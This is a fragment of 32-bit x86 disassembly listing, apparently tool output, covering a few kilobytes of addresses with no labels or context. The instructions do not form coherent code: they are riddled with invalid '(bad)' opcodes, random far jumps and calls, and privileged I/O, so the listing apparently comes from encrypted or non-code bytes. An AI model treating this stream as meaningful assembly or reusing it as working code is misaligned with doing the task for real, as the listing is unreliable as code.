  4117d8:	jmp    0x57cf:0xe0917a70
  4117df:	data16 loope 0x4117c0
  4117e2:	jo     0x411773
  4117e4:	(bad)  
  4117e5:	std    
  4117e6:	dec    esp
  4117e7:	das    
  4117e8:	adc    ch,BYTE PTR [esi+0x58]
  4117eb:	cmp    DWORD PTR [edi-0x15],0xffffffbc
  4117ef:	inc    ecx
  4117f0:	mov    ds:0xcca7ceac,al
  4117f5:	lahf   
  4117f6:	stc    
  4117f7:	lock push esi
  4117f9:	push   cs
  4117fa:	jo     0x41185d
  4117fc:	(bad)  
  4117fe:	sbb    bh,BYTE PTR [ecx]
  411800:	lea    ebp,[esi-0x3a4f662d]
  411806:	xor    DWORD PTR [ecx-0x30],0x29
  41180a:	jp     0x4117b7
  41180c:	mov    es,WORD PTR [edi-0x3b]
  41180f:	repnz lahf 
  411811:	or     DWORD PTR [ebx],ebx
  411813:	jbe    0x4117c7
  411815:	push   cs
  411816:	leave  
  411817:	mov    WORD PTR [ebp+0x4c],?
  41181a:	enter  0x77e4,0xf1
  41181e:	xchg   ebx,eax
  41181f:	xchg   ebx,eax
  411820:	or     DWORD PTR [edx],edx
  411822:	out    dx,al
  411823:	inc    ebp
  411824:	cli    
  411825:	jp     0x411809
  411827:	jb     0x4117f6
  411829:	or     BYTE PTR [edx],al
  41182b:	mov    dl,0xcf
  41182d:	retf   
  41182e:	pop    ds
  41182f:	test   al,0xd4
  411831:	out    dx,al
  411832:	lods   eax,DWORD PTR ds:[esi]
  411833:	xor    eax,0x85c3bf16
  411838:	xlat   BYTE PTR ds:[ebx]
  411839:	jle    0x411838
  41183b:	inc    esi
  41183c:	sbb    DWORD PTR ds:0x73571e65,eax
  411842:	aas    
  411843:	dec    ecx
  411844:	pop    ebp
  411845:	xchg   DWORD PTR [edx],ecx
  411847:	js     0x411819
  411849:	lods   eax,DWORD PTR ds:[esi]
  41184a:	ret    0xeef7
  41184d:	daa    
  41184e:	or     DWORD PTR [ebx],edx
  411850:	mov    bh,0x1
  411852:	dec    edx
  411853:	mov    ah,0xfc
  411855:	retf   
  411856:	dec    ebx
  411857:	pop    ebp
  411858:	and    BYTE PTR [ebp-0x7e3b4ba5],ch
  41185e:	inc    esp
  41185f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411860:	lock ret 0xe406
  411864:	aas    
  411865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411866:	xchg   edi,eax
  411867:	dec    esi
  411868:	test   eax,0x78d64693
  41186d:	(bad)  
  41186f:	cmp    ah,cl
  411871:	dec    esi
  411872:	sub    DWORD PTR [eax],0xffffffda
  411875:	add    BYTE PTR [esp+eax*1-0x5d],dl
  411879:	adc    bl,BYTE PTR [esi]
  41187b:	xor    DWORD PTR [esi+eax*1+0x15],edi
  41187f:	cmp    DWORD PTR [eax+ebx*8+0x28551820],eax
  411886:	adc    bl,dl
  411888:	int3   
  411889:	push   eax
  41188a:	jb     0x41185a
  41188c:	add    DWORD PTR [ebp+0x62],ebp
  41188f:	fisttp WORD PTR [edi]
  411891:	sub    DWORD PTR [esi+esi*8-0x65],esi
  411895:	mov    dl,0x1d
  411897:	and    ch,BYTE PTR [eax+0x1698d40b]
  41189d:	jne    0x4118b8
  41189f:	jmp    esp
  4118a1:	mov    esp,0x5b7e691e
  4118a6:	leave  
  4118a7:	mov    cl,0xca
  4118a9:	daa    
  4118aa:	mov    eax,0xaabb6eac
  4118af:	nop
  4118b0:	pop    ss
  4118b1:	test   al,0x3
  4118b3:	add    eax,0x5be63fda
  4118b8:	call   DWORD PTR [ecx-0x425cd9b2]
  4118be:	stc    
  4118bf:	inc    edx
  4118c0:	cmp    al,0x73
  4118c2:	inc    eax
  4118c3:	sub    ebx,eax
  4118c5:	mov    bh,0xa0
  4118c7:	stc    
  4118c8:	sbb    dh,BYTE PTR [edx+0x9a815c]
  4118ce:	arpl   WORD PTR [ebx-0x3d774111],si
  4118d4:	loope  0x41193e
  4118d6:	in     al,dx
  4118d7:	cs into 
  4118d9:	scas   al,BYTE PTR es:[edi]
  4118da:	aas    
  4118db:	call   0xb4a7:0x5831b866
  4118e2:	dec    ebp
  4118e3:	fadd   QWORD PTR [ebx]
  4118e5:	cmp    ecx,DWORD PTR [ebx-0x615c66e8]
  4118eb:	xor    eax,0x9cd36475
  4118f0:	mov    ch,0x8f
  4118f2:	cmc    
  4118f3:	icebp  
  4118f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f5:	lods   eax,DWORD PTR ds:[esi]
  4118f6:	jb     0x41194e
  4118f8:	push   ebp
  4118f9:	xor    BYTE PTR [ecx],al
  4118fb:	sub    eax,0xdd5722af
  411900:	rcr    al,1
  411902:	cmp    ch,BYTE PTR [ebp-0x1b]
  411905:	into   
  411906:	addr16 lahf 
  411908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411909:	ins    DWORD PTR es:[edi],dx
  41190a:	ret    0xd27a
  41190d:	ret    
  41190e:	xchg   DWORD PTR [ebp+eax*1-0x68],ecx
  411912:	jl     0x411989
  411914:	mov    ch,BYTE PTR [esi+0x44660441]
  41191a:	xor    DWORD PTR [edx+0x356cea02],edi
  411920:	mov    al,ds:0x24db4e3a
  411925:	cmc    
  411926:	mov    esi,gs
  411928:	cmp    al,0x3c
  41192b:	jne    0x4119a4
  41192d:	dec    esi
  41192e:	das    
  41192f:	and    eax,0xf098150c
  411934:	add    DWORD PTR [ebp+0x68465046],ecx
  41193a:	push   DWORD PTR [ecx+0x42]
  41193d:	shr    BYTE PTR [eax-0x3d924087],1
  411943:	ss (bad) 
  411945:	push   0xffffffaf
  411947:	jns    0x41196d
  411949:	sahf   
  41194a:	dec    ebx
  41194b:	xchg   ebp,eax
  41194c:	dec    edx
  41194d:	add    DWORD PTR ds:0xfc092c80,ecx
  411953:	inc    edx
  411954:	sub    al,0x75
  411956:	xchg   DWORD PTR [esi+0x30e7a45c],esp
  41195c:	cmp    al,BYTE PTR [ecx+0x4e514f88]
  411962:	fs pop ecx
  411964:	int3   
  411965:	scas   eax,DWORD PTR es:[edi]
  411966:	jb     0x4118ee
  411968:	adc    BYTE PTR [ebp-0x44],dl
  41196b:	imul   edx,DWORD PTR [edx+esi*1-0x40],0xffffffef
  411970:	pop    esi
  411971:	loopne 0x4119a1
  411973:	mov    DWORD PTR [eax],eax
  411975:	rol    BYTE PTR [edi],cl
  411977:	scas   eax,DWORD PTR es:[edi]
  411978:	pop    es
  411979:	xchg   DWORD PTR [eax-0x14],ebx
  41197c:	inc    esi
  41197d:	into   
  41197e:	sub    eax,0xa1a63fb7
  411983:	(bad)  
  411985:	inc    esp
  411986:	dec    ecx
  411987:	fldcw  WORD PTR [edi-0x54]
  41198a:	fidivr DWORD PTR [ecx]
  41198c:	add    DWORD PTR [edi-0x3b516e06],0xbbc1b978
  411996:	icebp  
  411997:	in     al,0x95
  411999:	aaa    
  41199a:	push   cs
  41199b:	mov    edx,0x64f5afd8
  4119a0:	pusha  
  4119a1:	add    eax,eax
  4119a3:	xchg   DWORD PTR [ecx-0x15c65bcc],ebp
  4119a9:	adc    BYTE PTR [edx-0x50],cl
  4119ac:	push   esi
  4119ad:	ret    
  4119ae:	or     BYTE PTR [esi-0x22],al
  4119b1:	inc    esi
  4119b2:	jns    0x411967
  4119b4:	stos   BYTE PTR es:[edi],al
  4119b5:	out    dx,al
  4119b6:	jno    0x41198c
  4119b8:	xchg   edx,eax
  4119b9:	xchg   ecx,eax
  4119ba:	(bad)  
  4119bb:	rcl    BYTE PTR [esp+ebp*2],0x72
  4119bf:	push   cs
  4119c0:	in     eax,dx
  4119c1:	imul   ecx,DWORD PTR [ebp+edx*1-0x7d],0x50
  4119c6:	mov    al,0x8b
  4119c8:	call   0x43782f6d
  4119cd:	push   es
  4119ce:	out    0xa,al
  4119d0:	push   cs
  4119d1:	sbb    dl,BYTE PTR [ecx+0x14]
  4119d4:	jle    0x41195e
  4119d6:	lock cmp dl,bh
  4119d9:	xor    edi,DWORD PTR [ebx-0x68]
  4119dc:	popf   
  4119dd:	ins    DWORD PTR es:[di],dx
  4119df:	jb     0x4119e0
  4119e1:	pop    edi
  4119e2:	jo     0x4119c3
  4119e4:	in     al,dx
  4119e5:	add    ah,BYTE PTR [ecx+esi*4-0x156f0329]
  4119ec:	cli    
  4119ed:	or     al,0x42
  4119ef:	shl    BYTE PTR [esi+0x3b3e826e],0x1f
  4119f6:	cmp    DWORD PTR [ecx-0x2661b2e4],edx
  4119fc:	sti    
  4119fd:	lea    eax,[ecx-0x42]
  411a00:	push   es
  411a01:	fmul   st,st(5)
  411a03:	dec    edx
  411a05:	loop   0x411a29
  411a07:	dec    edi
  411a08:	fs loope 0x411a74
  411a0b:	rol    DWORD PTR [eax+0xbcfa3f3],0x19
  411a12:	adc    eax,0x7f21a799
  411a17:	outs   dx,DWORD PTR cs:[esi]
  411a19:	dec    ebx
  411a1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a1c:	sbb    ebp,DWORD PTR [ecx-0x5649e1ec]
  411a22:	out    dx,eax
  411a23:	push   0x50e2e1b9
  411a28:	ins    BYTE PTR es:[edi],dx
  411a29:	call   0xbdaa:0x33aceb14
  411a30:	(bad)  
  411a31:	push   0xb19873ba
  411a36:	mov    eax,ds:0x6652755d
  411a3b:	dec    esi
  411a3c:	inc    ebx
  411a3d:	cmp    eax,0x35b23190
  411a42:	dec    edi
  411a43:	imul   edx
  411a45:	and    edi,DWORD PTR [edx]
  411a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a48:	out    dx,al
  411a49:	push   ds
  411a4a:	push   eax
  411a4b:	jb     0x4119d1
  411a4d:	arpl   WORD PTR [esi],bx
  411a4f:	fmul   DWORD PTR [edi]
  411a51:	xor    BYTE PTR [eax-0x404205d9],ch
  411a57:	dec    ebp
  411a58:	das    
  411a59:	cmp    al,0x17
  411a5b:	pop    ebp
  411a5c:	push   ss
  411a5d:	retf   
  411a5e:	jmp    0x411a25
  411a60:	push   esi
  411a61:	push   0xffffffc1
  411a63:	push   ebp
  411a64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a65:	mov    ds:0x4b01ceec,al
  411a6a:	jnp    0x411a61
  411a6c:	loopne 0x411a47
  411a6e:	(bad)  
  411a6f:	mov    al,ds:0x71013189
  411a74:	lods   al,BYTE PTR ds:[esi]
  411a75:	mov    edi,0x734fe98e
  411a7a:	mov    ecx,DWORD PTR [eax]
  411a7c:	dec    ecx
  411a7d:	(bad)  
  411a7e:	sbb    eax,0xea33c9d7
  411a83:	clc    
  411a84:	icebp  
  411a85:	xchg   BYTE PTR [esi],bh
  411a87:	popa   
  411a88:	sbb    eax,0x96a60658
  411a8d:	dec    ecx
  411a8e:	lods   al,BYTE PTR ds:[esi]
  411a8f:	xchg   edx,eax
  411a90:	(bad)  
  411a91:	loope  0x411ad7
  411a93:	and    al,0x45
  411a95:	jbe    0x411ae5
  411a97:	xchg   ebp,eax
  411a98:	mov    bl,0x8f
  411a9a:	mov    bl,0x9c
  411a9c:	imul   esi,DWORD PTR ds:0x5739e5f3,0x47319b71
  411aa6:	pusha  
  411aa7:	or     ecx,esp
  411aa9:	retf   0x3138
  411aac:	cmp    al,0xb7
  411aae:	push   esp
  411aaf:	fldenv [ebx+0x8b40af9]
  411ab5:	sub    DWORD PTR [ebx],ebp
  411ab7:	les    edx,FWORD PTR [ebx-0x2f]
  411aba:	push   ebp
  411abb:	sub    edx,esp
  411abd:	pavgw  mm5,QWORD PTR ds:0x1e28e447
  411ac4:	xor    al,0x7f
  411ac6:	inc    edx
  411ac7:	retf   0xb7dc
  411aca:	mov    bl,0x49
  411acc:	mov    ecx,0xe226a2ae
  411ad1:	xor    al,BYTE PTR [edi+edx*8+0x7def993c]
  411ad8:	mov    esi,0x2a15cd62
  411add:	test   eax,0x8f033b1f
  411ae2:	arpl   WORD PTR [edi-0x4f],si
  411ae5:	push   ebp
  411ae6:	inc    esp
  411ae7:	xchg   ebp,eax
  411ae8:	sbb    DWORD PTR [edx-0x71cddd6b],ecx
  411aee:	jns    0x411add
  411af0:	mov    esi,0xdd3bbe1a
  411af5:	ins    BYTE PTR es:[edi],dx
  411af6:	sbb    DWORD PTR [edi],ebp
  411af8:	add    BYTE PTR [edi-0x18],al
  411afb:	(bad)  
  411afc:	jo     0x411afc
  411afe:	dec    ebx
  411aff:	add    eax,0xcda6f98c
  411b04:	stos   DWORD PTR es:[edi],eax
  411b05:	out    0xe3,al
  411b07:	stos   DWORD PTR es:[edi],eax
  411b08:	mov    ebx,0xdb5f0026
  411b0d:	shr    cl,0x90
  411b10:	test   eax,0x6cf0e087
  411b15:	dec    esi
  411b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b17:	push   ecx
  411b18:	pop    edi
  411b19:	popf   
  411b1a:	lds    edi,FWORD PTR [edx+ecx*4-0x3c]
  411b1e:	jmp    0x411b75
  411b20:	mov    dh,0xfe
  411b22:	sbb    esp,DWORD PTR [edx-0x59]
  411b25:	in     eax,dx
  411b26:	mov    bh,0x21
  411b28:	std    
  411b29:	ror    BYTE PTR [esi-0x27e4e829],1
  411b2f:	add    DWORD PTR [ebx],0xfffffff3
  411b32:	dec    ebp
  411b33:	or     bh,ah
  411b35:	fild   DWORD PTR [esi]
  411b37:	es adc bh,ch
  411b3a:	hlt    
  411b3b:	fs (bad) 
  411b3d:	aam    0xc3
  411b3f:	adc    dh,dl
  411b41:	adc    al,0x29
  411b43:	fs mov edx,eax
  411b46:	or     al,0xc1
  411b48:	enter  0xf76c,0x62
  411b4c:	push   edx
  411b4d:	mov    dh,0xf4
  411b4f:	or     dl,BYTE PTR [edi+0xe]
  411b52:	cmp    ah,ah
  411b54:	js     0x411b50
  411b56:	xlat   BYTE PTR ds:[ebx]
  411b57:	jl     0x411bc5
  411b59:	sbb    BYTE PTR [esi+0x49],bl
  411b5c:	push   es
  411b5d:	xlat   BYTE PTR ds:[ebx]
  411b5e:	mov    ecx,0x41833738
  411b63:	cmp    DWORD PTR [ebp+0x329dd73f],ecx
  411b69:	mov    BYTE PTR [esp+edi*1-0x19],bl
  411b6d:	ja     0x411be0
  411b6f:	xor    DWORD PTR [edx+ebx*1+0x1fecafed],ebx
  411b76:	xchg   esi,eax
  411b77:	iret   
  411b78:	mov    ds:0xa2ce872a,al
  411b7d:	shl    BYTE PTR [esi+0x5600be18],1
  411b83:	jg     0x411b0d
  411b85:	sar    BYTE PTR [ebx],1
  411b87:	adc    BYTE PTR [edi],dh
  411b89:	push   cs
  411b8a:	pop    esp
  411b8b:	(bad)  
  411b8d:	inc    edx
  411b8e:	std    
  411b8f:	add    eax,0xf24c81ab
  411b94:	add    al,0xc
  411b96:	xchg   edi,eax
  411b97:	fisub  DWORD PTR [edx+0x437ac578]
  411b9d:	add    edx,ebx
  411b9f:	retf   0xa025
  411ba2:	or     ecx,ebx
  411ba4:	pop    ds
  411ba5:	xor    ch,BYTE PTR [ebp-0x176377be]
  411bab:	shr    BYTE PTR [ebx],0xb9
  411bae:	and    ecx,edx
  411bb0:	xchg   edi,eax
  411bb1:	iret   
  411bb2:	mov    edx,0x394b9651
  411bb7:	ss fadd st,st(0)
  411bba:	or     BYTE PTR [ebx],bh
  411bbc:	test   eax,0x4ffab31b
  411bc1:	push   ebp
  411bc2:	in     al,0x5d
  411bc4:	ficom  WORD PTR [ecx+0x78]
  411bc7:	jbe    0x411be0
  411bc9:	push   0xd57e759
  411bce:	jmp    0x94d8:0xda7200c6
  411bd5:	xchg   bl,cl
  411bd7:	dec    eax
  411bd8:	call   0x1431:0x91e8ddd3
  411bdf:	or     BYTE PTR [ebx+eax*1-0x60],0x1a
  411be4:	addr16 or al,0x3d
  411be7:	inc    esi
  411be8:	jbe    0x411bc0
  411bea:	xchg   esi,eax
  411beb:	and    esp,DWORD PTR [eax+esi*8+0x60]
  411bef:	outs   dx,BYTE PTR ds:[esi]
  411bf0:	das    
  411bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf2:	test   al,0xbc
  411bf4:	mov    BYTE PTR [ebx-0x4468332c],cl
  411bfa:	or     ecx,DWORD PTR [ebx-0x3c1be663]
  411c00:	cmc    
  411c01:	pop    edi
  411c02:	push   es
  411c03:	sbb    DWORD PTR [edx-0x34e1293f],0x7f
  411c0a:	push   0x7295c6d6
  411c0f:	jb     0x411bd0
  411c11:	fsubr  st,st(3)
  411c13:	mov    ds:0xd1a3bd64,eax
  411c18:	leave  
  411c19:	inc    esp
  411c1a:	mov    ecx,0xa949bc5a
  411c1f:	outs   dx,DWORD PTR ds:[esi]
  411c20:	adc    BYTE PTR [edx*2+0x2961e141],bh
  411c27:	mov    bl,0x37
  411c29:	addr16 mov ebx,0x7894da43
  411c2f:	aas    
  411c30:	fstp   QWORD PTR [edi-0x72]
  411c33:	fs jnp 0x411c0e
  411c36:	mov    bl,BYTE PTR ds:0x7485b408
  411c3c:	pop    ds
  411c3d:	fiadd  DWORD PTR ds:0xc4e955a2
  411c43:	cld    
  411c44:	popf   
  411c45:	push   ecx
  411c46:	and    DWORD PTR [ebp+0x40],0xb7ff6bbc
  411c4d:	jmp    0x889a:0x58129937
  411c54:	lods   al,BYTE PTR ds:[esi]
  411c55:	(bad)  
  411c56:	lds    edi,FWORD PTR [edi-0x65c512a2]
  411c5c:	sub    dl,0xac
  411c5f:	jecxz  0x411c42
  411c61:	sbb    DWORD PTR [ecx+0x3d],ebp
  411c64:	(bad)  
  411c65:	jl     0x411c8d
  411c67:	mov    edi,0x779247e1
  411c6c:	adc    DWORD PTR [ecx-0x37],esp
  411c6f:	repnz mov ds:0xa23701d5,eax
  411c75:	adc    DWORD PTR [ebx-0x7d898c87],esi
  411c7b:	jmp    0x5378:0x4200da11
  411c82:	cmp    esi,DWORD PTR [ecx]
  411c84:	sbb    al,0x2a
  411c86:	xchg   esp,eax
  411c87:	clc    
  411c88:	or     eax,0x302274e8
  411c8d:	ja     0x411c8f
  411c8f:	pop    es
  411c90:	cmp    dl,dh
  411c92:	cmc    
  411c93:	out    dx,eax
  411c94:	js     0x411c65
  411c96:	test   ebx,esi
  411c98:	inc    edx
  411c99:	sbb    al,0x61
  411c9b:	xlat   BYTE PTR ds:[ebx]
  411c9c:	into   
  411c9d:	add    BYTE PTR [ecx],0x85
  411ca0:	les    edx,FWORD PTR [esi-0x1e]
  411ca3:	lock pop ecx
  411ca5:	fistp  DWORD PTR [edi]
  411ca7:	loop   0x411ce7
  411ca9:	xor    al,0x15
  411cab:	loope  0x411d2b
  411cad:	test   DWORD PTR [edx+0x2265416f],edx
  411cb3:	outs   dx,DWORD PTR ds:[esi]
  411cb4:	out    0xb8,al
  411cb6:	push   cs
  411cb7:	and    BYTE PTR [ebx+0x43e8100a],al
  411cbd:	leave  
  411cbe:	mov    ds:0x484e025a,eax
  411cc4:	loopne 0x411c5d
  411cc6:	push   ecx
  411cc7:	inc    ebx
  411cc8:	(bad)  [esi+0x64b1369a]
  411cce:	adc    al,0x9a
  411cd0:	add    eax,0x24088e9c
  411cd5:	push   0x67
  411cd7:	sub    ebx,DWORD PTR [esi]
  411cd9:	add    DWORD PTR [ebp+ebp*8-0x2e24d42d],eax
  411ce0:	mov    sp,WORD PTR fs:[ebx+0x1a3f6ca2]
  411ce8:	cmc    
  411ce9:	test   BYTE PTR [esi-0x34],ah
  411cec:	xor    DWORD PTR [edi+eax*8+0x5552d38d],edx
  411cf3:	pop    edi
  411cf4:	mov    bl,BYTE PTR [ecx]
  411cf6:	push   ss
  411cf7:	out    0xf4,eax
  411cf9:	test   DWORD PTR [ebx],esp
  411cfb:	or     al,BYTE PTR [edx]
  411cfd:	dec    esi
  411cfe:	jnp    0x411d73
  411d00:	rcr    BYTE PTR [edi-0x605b7a2e],0xe9
  411d07:	mov    bl,bh
  411d09:	xchg   esp,ecx
  411d0b:	imul   ch
  411d0d:	mov    eax,0x31d103b4
  411d12:	scas   al,BYTE PTR es:[edi]
  411d13:	fwait
  411d14:	aas    
  411d15:	dec    BYTE PTR [edx+0x1]
  411d18:	mov    edi,0xdc766f37
  411d1d:	jecxz  0x411d97
  411d1f:	sbb    dh,bh
  411d21:	mov    bh,0x62
  411d23:	pop    ss
  411d24:	xchg   esp,eax
  411d25:	add    cl,BYTE PTR [edi+0x40]
  411d28:	(bad)  
  411d2a:	mov    ds:0xd9f6e194,eax
  411d2f:	inc    edx
  411d30:	push   edx
  411d31:	(bad)  
  411d32:	mov    dh,0xe
  411d34:	xchg   DWORD PTR [ebx+ecx*8+0x463e5347],edx
  411d3b:	loop   0x411cda
  411d3d:	inc    ebx
  411d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d3f:	fwait
  411d40:	sbb    ah,BYTE PTR [ebp-0x26]
  411d43:	mov    DWORD PTR [edi+ebx*4-0x21f3d3ff],ebx
  411d4a:	cmp    BYTE PTR [edx-0xabb999c],0x26
  411d51:	popf   
  411d52:	mov    ebp,0x72261495
  411d57:	push   esi
  411d58:	mov    dh,0xb3
  411d5a:	xchg   ebp,eax
  411d5b:	and    al,0xc1
  411d5d:	sbb    al,0xc7
  411d5f:	(bad)  
  411d61:	enter  0x382,0x4e
  411d65:	jbe    0x411d0a
  411d67:	add    al,0x5a
  411d69:	dec    eax
  411d6a:	je     0x411dc3
  411d6c:	jae    0x411d39
  411d6e:	jp     0x411ddb
  411d70:	inc    ebp
  411d71:	xchg   edi,eax
  411d72:	repnz data16 cld 
  411d75:	mov    DWORD PTR [edi],edi
  411d77:	sub    edi,0xdbd65642
  411d7d:	outs   dx,DWORD PTR ds:[esi]
  411d7e:	sub    al,0x65
  411d80:	mov    WORD PTR [esi+0x71bc09be],?
  411d86:	mov    al,0x49
  411d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d89:	xor    al,0x8f
  411d8b:	sbb    ebx,DWORD PTR [ebp-0x658fdd6e]
  411d91:	lahf   
  411d92:	mov    cl,0xa7
  411d94:	int3   
  411d95:	clc    
  411d96:	stc    
  411d97:	xor    DWORD PTR [edi-0x3a1e6e99],ebx
  411d9d:	rcr    BYTE PTR [ecx-0x5c],1
  411da0:	add    eax,0x5c73b3cd
  411da5:	loop   0x411d6b
  411da7:	aaa    
  411da8:	push   edx
  411da9:	sbb    ah,BYTE PTR [eax]
  411dab:	popf   
  411dac:	or     DWORD PTR [edx+ecx*8],edi
  411daf:	sub    al,al
  411db1:	fistp  QWORD PTR [edi-0xa77f35b]
  411db7:	ss ds mov ch,0xd5
  411dbb:	mov    esi,0xc421ead5
  411dc0:	dec    esi
  411dc1:	scas   eax,DWORD PTR es:[edi]
  411dc2:	push   esp
  411dc3:	outs   dx,DWORD PTR ds:[esi]
  411dc4:	add    DWORD PTR [esp+ebp*8+0x4bb49ef4],esi
  411dcb:	pop    ecx
  411dcc:	push   ebx
  411dcd:	das    
  411dce:	pop    ebx
  411dcf:	lock mul DWORD PTR [edx]
  411dd2:	xchg   cl,ah
  411dd4:	das    
  411dd5:	adc    BYTE PTR [ebp+ebp*8+0xf],bl
  411dd9:	dec    ebx
  411dda:	jns    0x411dae
  411ddc:	dec    esi
  411ddd:	mov    edx,0xe1b73f26
  411de2:	aas    
  411de3:	std    
  411de4:	jecxz  0x411d83
  411de6:	jmp    FWORD PTR [edx]
  411de8:	cli    
  411de9:	push   ebp
  411dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411deb:	mov    edx,ebp
  411ded:	cmp    al,0xc8
  411def:	das    
  411df0:	enter  0xec8,0xf5
  411df4:	rol    BYTE PTR ds:[edx-0x59],1
  411df8:	xor    eax,DWORD PTR [edx+edx*4-0x441f1064]
  411dff:	mov    BYTE PTR ds:0x6f5f3788,ah
  411e05:	out    0x9b,al
  411e07:	adc    edx,DWORD PTR [ecx+edx*8]
  411e0a:	aaa    
  411e0b:	lahf   
  411e0c:	add    DWORD PTR [ebx+0x40ca4a5a],ebx
  411e12:	int3   
  411e13:	retf   0xbd07
  411e16:	int    0x45
  411e18:	push   esi
  411e19:	mov    ch,0x41
  411e1b:	jbe    0x411e86
  411e1d:	xchg   edi,eax
  411e1e:	jne    0x411e45
  411e20:	or     BYTE PTR ds:0x943e293c,dl
  411e26:	push   es
  411e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e28:	or     eax,0xa814fc1d
  411e2d:	push   ebp
  411e2e:	inc    ecx
  411e2f:	push   ecx
  411e30:	lods   al,BYTE PTR ds:[esi]
  411e31:	daa    
  411e32:	scas   al,BYTE PTR es:[edi]
  411e33:	sahf   
  411e34:	jg     0x411e27
  411e36:	cmp    DWORD PTR [ebx-0x2675a3d1],ebp
  411e3c:	cmp    BYTE PTR [ebx],bl
  411e3e:	sub    ebx,DWORD PTR [ebx-0x7fc7f211]
  411e44:	repnz adc eax,0xf294a354
  411e4a:	jbe    0x411eba
  411e4c:	cmp    al,0xc7
  411e4e:	test   bh,ah
  411e50:	call   0xa363a1a6
  411e55:	popa   
  411e56:	mov    ecx,0x2ea0dc5a
  411e5b:	fwait
  411e5c:	cwde   
  411e5d:	push   esi
  411e5e:	cs loope 0x411e27
  411e61:	std    
  411e62:	enter  0xf41c,0x59
  411e66:	or     eax,0x9e960235
  411e6b:	cmc    
  411e6c:	pushf  
  411e6d:	mov    ebp,0x159f2bb5
  411e72:	test   al,0x53
  411e74:	pop    esp
  411e75:	cmp    DWORD PTR [ebx],esi
  411e77:	add    ah,dh
  411e79:	ret    0xd11c
  411e7c:	push   cs
  411e7d:	adc    eax,0x6b7c4250
  411e82:	and    DWORD PTR [eax+0x3a],edi
  411e85:	or     al,0xcd
  411e87:	inc    ebp
  411e88:	stc    
  411e89:	mov    esp,DWORD PTR [ebx-0x57b42945]
  411e8f:	xor    BYTE PTR [eax+0x2],bh
  411e92:	fadd   QWORD PTR [eax+0x69]
  411e95:	mov    bl,0xd
  411e97:	enter  0x3ff9,0xd5
  411e9b:	pop    esi
  411e9c:	iret   
  411e9d:	mov    ebx,ebp
  411e9f:	pop    esi
  411ea0:	or     eax,0x563e1dc8
  411ea5:	in     al,dx
  411ea6:	cmp    ecx,eax
  411ea8:	in     eax,0xf0
  411eaa:	adc    esp,esp
  411eac:	cmp    al,0x0
  411eae:	es scas al,BYTE PTR es:[edi]
  411eb0:	inc    ebx
  411eb1:	mov    dl,0x88
  411eb3:	popa   
  411eb4:	pop    ecx
  411eb5:	push   eax
  411eb6:	nop
  411eb7:	mov    DWORD PTR [eax],ecx
  411eb9:	cmp    eax,0xbfa7a428
  411ebe:	pop    ss
  411ebf:	or     al,0xe4
  411ec1:	in     al,dx
  411ec2:	and    al,0x82
  411ec4:	(bad)  
  411ec6:	add    al,0xd0
  411ec8:	mov    edx,0x79a9731e
  411ecd:	test   eax,0xb076f944
  411ed2:	mov    dh,0x2a
  411ed4:	xchg   edi,eax
  411ed5:	pop    ss
  411ed6:	(bad)  
  411ed7:	cld    
  411ed8:	and    eax,0x31344e85
  411edd:	stos   BYTE PTR es:[edi],al
  411ede:	adc    DWORD PTR ds:0xc0fba703,ebp
  411ee4:	test   DWORD PTR [edx-0x4e23618d],0x72410c81
  411eee:	add    DWORD PTR [ecx+eiz*4-0x4a],esp
  411ef2:	xchg   BYTE PTR [esi],bl
  411ef4:	sbb    ebp,DWORD PTR [edi-0xe]
  411ef7:	call   0xcc0c:0x50010d55
  411efe:	push   ebx
  411eff:	mov    bh,0x91
  411f01:	les    edi,FWORD PTR [ebx+0x15cc81ce]
  411f07:	jb     0x411f6e
  411f09:	jbe    0x411f0e
  411f0b:	rep lods al,BYTE PTR ds:[esi]
  411f0d:	sub    BYTE PTR [edx+0x13175bc2],bl
  411f13:	xor    al,0x2b
  411f15:	fld    st(4)
  411f17:	cmc    
  411f18:	add    BYTE PTR [edx],ch
  411f1a:	loopne 0x411ed1
  411f1c:	xor    BYTE PTR [ecx+0x218754d7],bl
  411f22:	sub    dh,ah
  411f24:	mov    dl,0xc7
  411f26:	jo     0x411ed4
  411f28:	or     BYTE PTR [ebx+0x1d],al
  411f2b:	inc    esp
  411f2c:	pop    edx
  411f2d:	fwait
  411f2e:	repnz rcr dh,0xe3
  411f32:	and    DWORD PTR [ebx+eiz*1+0x61530433],eax
  411f39:	aam    0x6b
  411f3b:	xchg   ebx,eax
  411f3c:	cmp    BYTE PTR [ebp+0x27ae23ec],0xba
  411f43:	xor    al,BYTE PTR [ebx-0x23]
  411f46:	out    0x3e,al
  411f48:	push   esi
  411f49:	lock push ds
  411f4b:	pop    edx
  411f4c:	cmp    BYTE PTR [esi+0x67929385],cl
  411f52:	in     al,dx
  411f53:	mov    bh,0x30
  411f55:	jb     0x411ee0
  411f57:	dec    ebx
  411f58:	pop    ebx
  411f59:	enter  0x3551,0x26
  411f5d:	fcmove st,st(7)
  411f5f:	or     ebp,ebx
  411f61:	mov    BYTE PTR [eax-0x18],cl
  411f64:	xchg   esp,eax
  411f65:	cdq    
  411f66:	js     0x411ef3
  411f68:	mov    al,ds:0x7f4a7a8f
  411f6d:	or     dh,bl
  411f6f:	and    eax,0xca36cd26
  411f74:	rol    bl,1
  411f76:	add    DWORD PTR [ebx+0x78],edi
  411f79:	aam    0x30
  411f7b:	scas   eax,DWORD PTR es:[edi]
  411f7c:	fild   DWORD PTR [ebx-0x1c]
  411f7f:	mov    ch,0xa3
  411f81:	pop    edx
  411f82:	imul   ecx,DWORD PTR [esi*1-0x56d3441c],0x93125cb0
  411f8d:	inc    eax
  411f8e:	add    esi,DWORD PTR [ecx-0x32]
  411f91:	scas   eax,DWORD PTR es:[edi]
  411f92:	push   esi
